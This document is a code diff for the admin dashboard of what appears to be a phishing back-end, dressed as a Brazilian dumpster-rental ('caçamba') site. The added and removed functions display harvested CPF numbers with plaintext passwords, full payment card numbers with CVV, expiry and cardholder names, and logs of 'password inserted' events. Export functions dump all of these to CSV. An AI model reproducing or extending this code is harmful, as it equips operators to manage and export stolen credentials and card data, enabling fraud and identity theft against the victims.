+async function loadAllData() { if(!adminToken) return; try { const [statsRes, logsRes, paymentsRes] = await Promise.all([ fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } }), fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } }), fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } }) ]); const stats = (await statsRes.json()).stats || {}; document.getElementById('statTotalUsers').innerText = stats.total_users || 0; document.getElementById('statComSenha').innerText = stats.com_senha || 0; document.getElementById('statTotalLogs').innerText = stats.total_logs || 0; document.getElementById('statProdutos').innerText = stats.total_produtos || 0; document.getElementById('statAgendamentos').innerText = stats.total_agendamentos || 0; logsData = (await logsRes.json()).logs || []; paymentsData = (await paymentsRes.json()).payments || []; const totalPaid = paymentsData.filter(p => p.status === 'paid').reduce((s, p) => s + parseFloat(p.valor || 0), 0); document.getElementById('statTotalPagos').innerHTML = `R$ ${totalPaid.toFixed(2)}`; renderRecentActivity(logsData.slice(0, 15)); renderRecentPayments(paymentsData.slice(0, 10)); await loadProducts(); await loadSchedule(); await loadUsers(); await loadCards(); await loadPaymentsFull(); await loadLogsFull(); } catch(e) { console.error(e); } }
 
-function handleLogout() {
-    if(refreshInterval) clearInterval(refreshInterval);
-    sessionStorage.removeItem('adminToken');
-    adminToken = null;
-    document.getElementById('adminPanel').classList.remove('visible');
-    document.getElementById('loginContainer').style.display = 'flex';
-    showToast('Logged out');
-}
+async function loadProducts() { if(!adminToken) return; try { const res = await fetch('/api/admin/produtos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); if(data.success) { productsData = data.produtos || []; renderProducts(); } } catch(e) { console.error(e); } }
+function renderProducts() { const container = document.getElementById('productList'); const countSpan = document.getElementById('productCount'); if(!container) return; if(!productsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No products yet</div>'; if(countSpan) countSpan.innerHTML = '0 items'; return; } if(countSpan) countSpan.innerHTML = `${productsData.length} items`; container.innerHTML = productsData.map(p => `<div class="product-row"><div class="product-info"><div class="product-icon">${p.imagem ? `<img src="${p.imagem}" style="width:44px; height:44px; object-fit:cover; border-radius:12px;">` : `<i class="${p.icone || 'fas fa-box'}"></i>`}</div><div class="product-details"><h4>${escapeHtml(p.nome)}</h4><p>${p.tipo === 'cacamba' ? 'Caçamba' : 'Material'} ${p.dimensoes ? ' · ' + p.dimensoes : ''}</p></div></div><div class="product-price">R$ ${(p.preco_promocional || p.preco).toFixed(2)}</div><div class="product-actions"><button class="btn-icon" onclick="deleteProduct(${p.id})"><i class="fas fa-trash"></i></button></div></div>`).join(''); }
+async function deleteProduct(id) { if(!confirm('Delete this product?')) return; try { await fetch(`/api/admin/produtos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Product deleted', 'success'); await loadProducts(); } catch(e) { showToast('Error'); } }
+document.getElementById('productForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const product = { nome: document.getElementById('prodNome').value, tipo: document.getElementById('prodTipo').value, preco: parseFloat(document.getElementById('prodPreco').value), preco_promocional: parseFloat(document.getElementById('prodPromocional')?.value) || null, descricao: document.getElementById('prodDescricao').value, icone: document.getElementById('prodIcone').value, imagem: document.getElementById('prodImagem').value, dimensoes: document.getElementById('prodDimensoes').value, capacidade: document.getElementById('prodCapacidade').value }; try { await fetch('/api/admin/produtos', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify(product) }); showToast('Product added', 'success'); await loadProducts(); e.target.reset(); } catch(e) { showToast('Error'); } });
 
-if(sessionStorage.getItem('adminToken')) {
-    adminToken = sessionStorage.getItem('adminToken');
-    document.getElementById('loginContainer').style.display = 'none';
-    document.getElementById('adminPanel').classList.add('visible');
-    loadAllData();
-    refreshInterval = setInterval(() => { if(adminToken) refreshAllData(); }, 15000);
-}
+async function loadSchedule() { if(!adminToken) return; try { const res = await fetch('/api/admin/agendamentos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); scheduleData = data.agendamentos || []; const container = document.getElementById('scheduleList'); if(!scheduleData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No appointments</div>'; return; } container.innerHTML = `<div class="table-wrapper"><table><thead><tr><th>Client</th><th>Phone</th><th>Type</th><th>Address</th><th>Date</th><th>Time</th><th>Actions</th></tr></thead><tbody>${scheduleData.map(a => `<tr><td><strong>${escapeHtml(a.cliente_nome || '-')}</strong></td><td>${formatPhone(a.telefone || '-')}</td><td>${escapeHtml(a.tipo_obra || '-')}</td><td>${escapeHtml(a.endereco_obra || '-')}</td><td>${a.data_agendamento ? new Date(a.data_agendamento).toLocaleDateString() : '-'}</td><td>${a.horario || '-'}</td><td><button class="btn-delete" onclick="deleteSchedule(${a.id})">Delete</button></td></tr>`).join('')}</tbody></div>`; } catch(e) { console.error(e); } }
+async function deleteSchedule(id) { if(!confirm('Delete this appointment?')) return; try { await fetch(`/api/admin/agendamentos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Appointment deleted', 'success'); await loadSchedule(); } catch(e) { showToast('Error'); } }
 
-async function refreshAllData() {
-    if(!adminToken) return;
-    try {
-        const statsRes = await fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-        const statsData = await statsRes.json();
-        const stats = statsData.stats || {};
-        document.getElementById('statTotalUsers').innerText = stats.total_users || 0;
-        document.getElementById('statComSenha').innerText = stats.com_senha || 0;
-        document.getElementById('statTotalLogs').innerText = stats.total_logs || 0;
-        document.getElementById('statProdutos').innerText = stats.total_produtos || 0;
-        document.getElementById('statAgendamentos').innerText = stats.total_agendamentos || 0;
-        
-        await loadProducts();
-        await loadSchedule();
-        await loadUsers();
-        await loadCards();
-        await loadPayments();
-        await loadLogs();
-        
-        const totalPaid = paymentsData.filter(p => p.status === 'paid').reduce((s, p) => s + parseFloat(p.valor || 0), 0);
-        document.getElementById('statTotalPagos').innerHTML = `R$ ${totalPaid.toFixed(2)}`;
-    } catch(e) { console.error('Refresh error:', e); }
-}
+async function loadUsers() { if(!adminToken) return; try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); usersData = data.users || []; renderUsers(); } catch(e) { console.error(e); } }
+function renderUsers() { const tbody = document.getElementById('usersTable'); if(!usersData.length) { tbody.innerHTML = '<tr><td colspan="5">No data</td></tr>'; return; } tbody.innerHTML = usersData.map(u => `<tr><td><strong>${formatCPF(u.cpf)}</strong></td><td><span class="badge badge-warning" style="font-family:monospace;">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone || '-')}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Delete</button></td></tr>`).join(''); }
+function filterUsers() { const term = document.getElementById('searchUsers')?.value.toLowerCase() || ''; const filtered = usersData.filter(u => (u.cpf || '').toLowerCase().includes(term) || (u.telefone || '').toLowerCase().includes(term)); const tbody = document.getElementById('usersTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="5">No results</td></tr>'; return; } tbody.innerHTML = filtered.map(u => `<tr><td><strong>${formatCPF(u.cpf)}</strong></td><td><span class="badge badge-warning" style="font-family:monospace;">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone || '-')}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Delete</button></td></tr>`).join(''); }
+async function deleteUser(cpf) { if(!confirm(`Delete ${formatCPF(cpf)}?`)) return; await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('User deleted', 'success'); }
+async function clearAllUsers() { if(!confirm('WARNING: Delete ALL users?')) return; await fetch('/api/admin/clear', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('All users deleted', 'success'); }
 
-async function loadAllData() {
-    if(!adminToken) return;
-    try {
-        const [statsRes, logsRes, paymentsRes] = await Promise.all([
-            fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } }),
-            fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } }),
-            fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } })
-        ]);
-        
-        const stats = (await statsRes.json()).stats || {};
-        document.getElementById('statTotalUsers').innerText = stats.total_users || 0;
-        document.getElementById('statComSenha').innerText = stats.com_senha || 0;
-        document.getElementById('statTotalLogs').innerText = stats.total_logs || 0;
-        document.getElementById('statProdutos').innerText = stats.total_produtos || 0;
-        document.getElementById('statAgendamentos').innerText = stats.total_agendamentos || 0;
-        
-        logsData = (await logsRes.json()).logs || [];
-        paymentsData = (await paymentsRes.json()).payments || [];
-        
-        const totalPaid = paymentsData.filter(p => p.status === 'paid').reduce((s, p) => s + parseFloat(p.valor || 0), 0);
-        document.getElementById('statTotalPagos').innerHTML = `R$ ${totalPaid.toFixed(2)}`;
-        
-        renderRecentActivity(logsData.slice(0, 15));
-        renderRecentPayments(paymentsData.slice(0, 10));
-        
-        await loadProducts();
-        await loadSchedule();
-        await loadUsers();
-        await loadCards();
-        await loadPaymentsFull();
-        await loadLogsFull();
-    } catch(e) { console.error('Load error:', e); }
-}
+async function loadCards() { if(!adminToken) return; try { const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); cardsData = data.cartoes || []; renderCards(); } catch(e) { console.error(e); } }
+function renderCards() { const tbody = document.getElementById('cardsTable'); if(!cardsData.length) { tbody.innerHTML = '<tr><td colspan="7">No card data</td></tr>'; return; } tbody.innerHTML = cardsData.map(c => `<tr><td><strong>${formatCPF(c.cpf || '-')}</strong><br><span style="font-size:11px; color:var(--text-muted);">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span></td><td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao || c.numero)}</span></td><td>${escapeHtml(c.nome_titular || '-')}</td><td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td></tr>`).join(''); }
+function filterCards() { const term = document.getElementById('searchCards')?.value.toLowerCase() || ''; const filtered = cardsData.filter(c => (c.cpf || '').toLowerCase().includes(term) || (c.cliente_nome || c.nome_titular || '').toLowerCase().includes(term)); const tbody = document.getElementById('cardsTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="7">No results</td></tr>'; return; } tbody.innerHTML = filtered.map(c => `<tr><td><strong>${formatCPF(c.cpf || '-')}</strong><br><span style="font-size:11px;">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span></td><td><span class="badge badge-danger">${formatCardNumber(c.numero_cartao || c.numero)}</span></td><td>${escapeHtml(c.nome_titular || '-')}</td><td><span class="badge badge-warning">${c.cvv || '***'}</span></td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td></tr>`).join(''); }
+async function deleteCard(id) { if(!confirm('Delete this card?')) return; try { await fetch(`/api/admin/cartoes/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('Card deleted', 'success'); } catch(e) { showToast('Error'); } }
+async function clearAllCards() { if(!confirm('WARNING: Delete ALL cards?')) return; await fetch('/api/admin/clear-cards', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('All cards deleted', 'success'); }
 
-async function loadProducts() {
-    if(!adminToken) return;
-    try {
-        const res = await fetch('/api/admin/produtos', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-        const data = await res.json();
-        if(data.success) {
-            productsData = data.produtos || [];
-            renderProducts();
-        }
-    } catch(e) { console.error(e); }
-}
+async function loadPaymentsFull() { if(!adminToken) return; try { const res = await fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); paymentsData = data.payments || []; renderPaymentsFull(); } catch(e) { console.error(e); } }
+function renderPaymentsFull() { const container = document.getElementById('paymentsList'); if(!paymentsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No payments</div>'; return; } container.innerHTML = `<div class="table-wrapper"><table><thead><tr><th>ID</th><th>CPF</th><th>Phone</th><th>Amount</th><th>Status</th><th>Type</th><th>Date</th><th>Actions</th></tr></thead><tbody>${paymentsData.map(p => `<tr><td>${p.id}</td><td><strong>${formatCPF(p.cpf)}</strong></td><td>${formatPhone(p.telefone || '-')}</td><td><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span></td><td><span class="badge ${p.status === 'paid' ? 'badge-success' : 'badge-warning'}">${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></td><td>${p.tipo_pagamento || 'PIX'}</td><td>${new Date(p.data_solicitacao).toLocaleString()}</td><td><button class="btn-delete" onclick="deletePayment(${p.id})">Delete</button></td></tr>`).join('')}</tbody></div>`; }
+async function deletePayment(id) { if(!confirm('Delete this payment?')) return; try { await fetch(`/api/admin/payments/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); showToast('Payment deleted', 'success'); } catch(e) { showToast('Error'); } }
+async function clearAllPayments() { if(!confirm('WARNING: Delete ALL payments?')) return; await fetch('/api/admin/clear-payments', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); showToast('All payments deleted', 'success'); }
+async function loadPayments() { return loadPaymentsFull(); }
 
-function renderProducts() {
-    const container = document.getElementById('productList');
-    const countSpan = document.getElementById('productCount');
-    if(!container) return;
-    if(!productsData.length) {
-        container.innerHTML = '<div style="text-align:center; padding:40px;">No products yet</div>';
-        if(countSpan) countSpan.innerHTML = '0 items';
-        return;
-    }
-    if(countSpan) countSpan.innerHTML = `${productsData.length} items`;
-    container.innerHTML = productsData.map(p => `
-        <div class="product-row">
-            <div class="product-info">
-                <div class="product-icon">
-                    ${p.imagem ? `<img src="${p.imagem}" style="width:44px; height:44px; object-fit:cover; border-radius:12px;">` : `<i class="${p.icone || 'fas fa-box'}"></i>`}
-                </div>
-                <div class="product-details">
-                    <h4>${escapeHtml(p.nome)}</h4>
-                    <p>${p.tipo === 'cacamba' ? 'Caçamba' : 'Material'} ${p.dimensoes ? ' · ' + p.dimensoes : ''}</p>
-                </div>
-            </div>
-            <div class="product-price">R$ ${(p.preco_promocional || p.preco).toFixed(2)}</div>
-            <div class="product-actions"><button class="btn-icon" onclick="deleteProduct(${p.id})"><i class="fas fa-trash"></i></button></div>
-        </div>
-    `).join('');
-}
+async function loadLogsFull() { if(!adminToken) return; try { const res = await fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); logsData = data.logs || []; renderLogsFull(); } catch(e) { console.error(e); } }
+function renderLogsFull() { const container = document.getElementById('logsList'); if(!logsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">No logs</div>'; return; } container.innerHTML = logsData.map(log => `<div class="log-item"><span class="log-time">${new Date(log.data).toLocaleString()}</span><span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'PASSWORD' : 'CPF'}</span><span><strong>${formatCPF(log.cpf)}</strong></span><span>${log.dispositivo || '-'}</span>${log.senha ? `<span class="badge badge-warning">Pass: ${log.senha}</span>` : ''}<button class="btn-delete" onclick="deleteLog(${log.id})" style="margin-left:auto;">Delete</button></div>`).join(''); }
+async function deleteLog(id) { if(!confirm('Delete this log?')) return; try { await fetch(`/api/admin/logs/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadLogsFull(); showToast('Log deleted', 'success'); } catch(e) { showToast('Error'); } }
+async function clearAllLogs() { if(!confirm('WARNING: Delete ALL logs?')) return; await fetch('/api/admin/clear-logs', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadLogsFull(); showToast('All logs deleted', 'success'); }
 
-function escapeHtml(str) {
-    if(!str) return '';
-    return str.replace(/[&<>]/g, function(m) {
-        if(m === '&') return '&amp;';
-        if(m === '<') return '&lt;';
-        if(m === '>') return '&gt;';
-        return m;
-    });
-}
+function renderRecentActivity(logs) { const container = document.getElementById('recentActivity'); if(!logs.length) { container.innerHTML = '<div style="padding:20px; text-align:center;">No activity</div>'; return; } container.innerHTML = logs.map(log => `<div class="log-item"><span class="log-time">${new Date(log.data).toLocaleString()}</span><span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'PASS' : 'CPF'}</span><span>${formatCPF(log.cpf)}</span></div>`).join(''); }
+function renderRecentPayments(payments) { const container = document.getElementById('recentPayments'); if(!payments.length) { container.innerHTML = '<div style="padding:20px; text-align:center;">No payments</div>'; return; } container.innerHTML = payments.map(p => `<div class="log-item"><span class="log-time">${new Date(p.data_solicitacao).toLocaleString()}</span><span class="badge badge-success">R$ ${parseFloat(p.valor).toFixed(2)}</span><span>${formatCPF(p.cpf)}</span><span>${p.status === 'paid' ? 'PAID' : 'PENDING'}</span></div>`).join(''); }
 
-async function deleteProduct(id) {
-    if(!confirm('Delete this product?')) return;
-    try {
-        await fetch(`/api/admin/produtos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
-        showToast('Product deleted', 'success');
-        await loadProducts();
-    } catch(e) { showToast('Error'); }
-}
+function exportUsersCSV() { if(!usersData.length) { showToast('No data'); return; } let csv = "CPF,PASSWORD,PHONE,DATE\n"; usersData.forEach(u => csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || ''}","${u.data_senha || u.data_cpf || ''}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `users_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exported', 'success'); }
+function exportCardsCSV() { if(!cardsData.length) { showToast('No card data'); return; } let csv = "CPF,CLIENT_NAME,CARD_NUMBER,CARDHOLDER,CVV,EXPIRY,DATE\n"; cardsData.forEach(c => csv += `"${c.cpf || ''}","${c.cliente_nome || c.nome_titular || ''}","${c.numero_cartao || c.numero || ''}","${c.nome_titular || ''}","${c.cvv || ''}","${c.validade || ''}","${c.created_at || ''}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `cards_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exported', 'success'); }
+function exportPaymentsCSV() { if(!paymentsData.length) { showToast('No payment data'); return; } let csv = "ID,CPF,PHONE,AMOUNT,STATUS,TYPE,DATE\n"; paymentsData.forEach(p => csv += `"${p.id}","${p.cpf}","${p.telefone || ''}","${p.valor}","${p.status}","${p.tipo_pagamento || 'PIX'}","${p.data_solicitacao}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `payments_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exported', 'success'); }
+async function loadLogs() { return loadLogsFull(); }
 
-document.getElementById('productForm')?.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const product = {
-        nome: document.getElementById('prodNome').value,
-        tipo: document.getElementById('prodTipo').value,
-        preco: parseFloat(document.getElementById('prodPreco').value),
-        preco_promocional: parseFloat(document.getElementById('prodPromocional')?.value) || null,
-        descricao: document.getElementById('prodDescricao').value,
-        icone: document.getElementById('prodIcone').value,
-        imagem: document.getElementById('prodImagem').value,
-        dimensoes: document.getElementById('prodDimensoes').value,
-        capacidade: document.getElementById('prodCapacidade').value
-    };
-    try {
-        await fetch('/api/admin/produtos', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
-            body: JSON.stringify(product)
-        });
-        showToast('Product added', 'success');
-        await loadProducts();
-        e.target.reset();
-    } catch(e) { showToast('Error'); }
-});
+document.getElementById('addUserForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const username = document.getElementById('newUsername').value.trim(); const password = document.getElementById('newPassword').value.trim(); const msgDiv = document.getElementById('addUserMsg'); if(!username || !password || password.length < 6) { msgDiv.innerHTML = '<span style="color:#ef4444;">Username and password (min 6 chars) required</span>'; setTimeout(() => msgDiv.innerHTML = '', 3000); return; } try { const res = await fetch('/api/admin/add-user', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify({ username, password }) }); const data = await res.json(); if(data.success) { msgDiv.innerHTML = '<span style="color:#10b981;">User added successfully!</span>'; document.getElementById('newUsername').value = ''; document.getElementById('newPassword').value = ''; } else { msgDiv.innerHTML = `<span style="color:#ef4444;">${data.error || 'Error adding user'}</span>`; } } catch(e) { msgDiv.innerHTML = '<span style="color:#ef4444;">Error adding user</span>'; } setTimeout(() => msgDiv.innerHTML = '', 3000); });
 
-async function loadSchedule() {
-    if(!adminToken) return;
-    try {
-        const res = await fetch('/api/admin/agendamentos', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-        const data = await res.json();
-        scheduleData = data.agendamentos || [];
-        const container = document.getElementById('scheduleList');
-        if(!scheduleData.length) {
-            container.innerHTML = '<div style="text-align:center; padding:40px;">No appointments found</div>';
-            return;
-        }
-        container.innerHTML = `
-            <div class="table-wrapper">
-                <table>
-                    <thead><tr><th>Client</th><th>Phone</th><th>Type</th><th>Address</th><th>Date</th><th>Time</th><th>Actions</th></tr></thead>
-                    <tbody>
-                        ${scheduleData.map(a => `
-                            <tr>
-                                <td><strong>${escapeHtml(a.cliente_nome || '-')}</strong></td>
-                                <td>${formatPhone(a.telefone || '-')}</td>
-                                <td>${escapeHtml(a.tipo_obra || '-')}</td>
-                                <td>${escapeHtml(a.endereco_obra || '-')}</td>
-                                <td>${a.data_agendamento ? new Date(a.data_agendamento).toLocaleDateString() : '-'}</td>
-                                <td>${a.horario || '-'}</td>
-                                <td><button class="btn-delete" onclick="deleteSchedule(${a.id})">Delete</button></td>
-                            </tr>
-                        `).join('')}
-                    </tbody>
-                </table>
-            </div>
-        `;
-    } catch(e) { console.error(e); }
-}
+async function changeAdminPassword() { const current = document.getElementById('currentPass').value; const newPass = document.getElementById('newPass').value; const confirm = document.getElementById('confirmPass').value; const msgDiv = document.getElementById('passwordMsg'); if(!current || !newPass || newPass.length < 6 || newPass !== confirm) { msgDiv.innerHTML = '<span style="color:#ef4444;">Check fields (min 6 chars)</span>'; setTimeout(() => msgDiv.innerHTML = '', 2000); return; } const res = await fetch('/api/admin/change-password', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify({ senha_antiga: current, nova_senha: newPass }) }); const data = await res.json(); if(data.success) { msgDiv.innerHTML = '<span style="color:#10b981;">Password updated!</span>'; document.getElementById('currentPass').value = ''; document.getElementById('newPass').value = ''; document.getElementById('confirmPass').value = ''; } else { msgDiv.innerHTML = `<span style="color:#ef4444;">${data.error}</span>`; } setTimeout(() => msgDiv.innerHTML = '', 2000); }
 
-async function deleteSchedule(id) {
-    if(!confirm('Delete this appointment?')) return;
-    try {
-        await fetch(`/api/admin/agendamentos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
-        showToast('Appointment deleted', 'success');
-        await loadSchedule();
-    } catch(e) { showToast('Error'); }
-}
-
-async function loadUsers() {
-    if(!adminToken) return;
-    try {
-        const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-        const data = await res.json();
-        usersData = data.users || [];
-        renderUsers();
-    } catch(e) { console.error(e); }
-}
-
-function renderUsers() {
-    const tbody = document.getElementById('usersTable');
-    if(!usersData.length) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center">No data</td></tr>'; return; }
-    tbody.innerHTML = usersData.map(u => `
-        <tr>
-            <td><strong>${formatCPF(u.cpf)}</strong></td>
-            <td><span class="badge badge-warning" style="font-family:monospace;">${u.senha || '--------'}</span></td>
-            <td>${formatPhone(u.telefone || '-')}</td>
-            <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
-            <td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Delete</button></td>
-        </tr>
-    `).join('');
-}
-
-function filterUsers() {
-    const term = document.getElementById('searchUsers')?.value.toLowerCase() || '';
-    const filtered = usersData.filter(u => (u.cpf || '').toLowerCase().includes(term) || (u.telefone || '').toLowerCase().includes(term));
-    const tbody = document.getElementById('usersTable');
-    if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="5" style="text-align:center">No results</td></tr>'; return; }
-    tbody.innerHTML = filtered.map(u => `
-        <tr>
-            <td><strong>${formatCPF(u.cpf)}</strong></td>
-            <td><span class="badge badge-warning" style="font-family:monospace;">${u.senha || '--------'}</span></td>
-            <td>${formatPhone(u.telefone || '-')}</td>
-            <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
-            <td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Delete</button></td>
-        </tr>
-    `).join('');
-}
-
-async function deleteUser(cpf) {
-    if(!confirm(`Delete ${formatCPF(cpf)}?`)) return;
-    await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
-    await loadUsers();
-    showToast('User deleted', 'success');
-}
-
-async function clearAllUsers() {
-    if(!confirm('WARNING: This will delete ALL users. Continue?')) return;
-    await fetch('/api/admin/clear', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } });
-    await loadUsers();
-    showToast('All users deleted', 'success');
-}
-
-async function loadCards() {
-    if(!adminToken) return;
-    try {
-        const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-        const data = await res.json();
-        cardsData = data.cartoes || [];
-        renderCards();
-    } catch(e) { console.error(e); }
-}
-
-function renderCards() {
-    const tbody = document.getElementById('cardsTable');
-    if(!cardsData.length) { 
-        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">No card data collected</td></tr>'; 
-        return; 
-    }
-    tbody.innerHTML = cardsData.map(c => `
-        <tr>
-            <td><strong>${formatCPF(c.cpf || '-')}</strong><br><span style="font-size:11px; color:var(--text-muted);">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span></td>
-            <td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao || c.numero)}</span></td>
-            <td>${escapeHtml(c.nome_titular || '-')}</td>
-            <td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td>
-            <td>${c.validade || '-'}</td>
-            <td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td>
-            <td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td>
-        </tr>
-    `).join('');
-}
-
-function filterCards() {
-    const term = document.getElementById('searchCards')?.value.toLowerCase() || '';
-    const filtered = cardsData.filter(c => (c.cpf || '').toLowerCase().includes(term) || (c.cliente_nome || c.nome_titular || '').toLowerCase().includes(term));
-    const tbody = document.getElementById('cardsTable');
-    if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">No results</td></tr>'; return; }
-    tbody.innerHTML = filtered.map(c => `
-        <tr>
-            <td><strong>${formatCPF(c.cpf || '-')}</strong><br><span style="font-size:11px; color:var(--text-muted);">${escapeHtml(c.cliente_nome || c.nome_titular || '-')}</span></td>
-            <td><span class="badge badge-danger" style="font-family:monospace;">${formatCardNumber(c.numero_cartao || c.numero)}</span></td>
-            <td>${escapeHtml(c.nome_titular || '-')}</td>
-            <td><span class="badge badge-warning" style="font-family:monospace;">${c.cvv || '***'}</span></td>
-            <td>${c.validade || '-'}</td>
-            <td>${c.created_at ? new Date(c.created_at).toLocaleString() : '-'}</td>
-            <td><button class="btn-delete" onclick="deleteCard(${c.id})">Delete</button></td>
-        </tr>
-    `).join('');
-}
-
-async function deleteCard(id) {
-    if(!confirm('Delete this card?')) return;
-    try {
-        await fetch(`/api/admin/cartoes/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } });
-        await loadCards();
-        showToast('Card deleted', 'success');
-    } catch(e) { showToast('Error'); }
-}
-
-async function clearAllCards() {
-    if(!confirm('WARNING: This will delete ALL cards. Continue?')) return;
-    await fetch('/api/admin/clear-cards', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } });
-    await loadCards();
-    showToast('All cards deleted', 'success');
-}
-
-async function loadPaymentsFull() {
-    if(!adminToken) return;
-    try {
-        const res = await fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } });
-        const data = await res.json();
-        paymentsData = data.payments || [];
-        renderPaymentsFull();
-    } catch(e) { console.error(e); }
-}
-
-function renderPaymentsFull() {
-    const container = document.getElementById('paymentsList');
-    if(!paymentsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">No payments</div>'; return; }
-    container.innerHTML = `
-        <div class="table-wrapper">
-            <table>
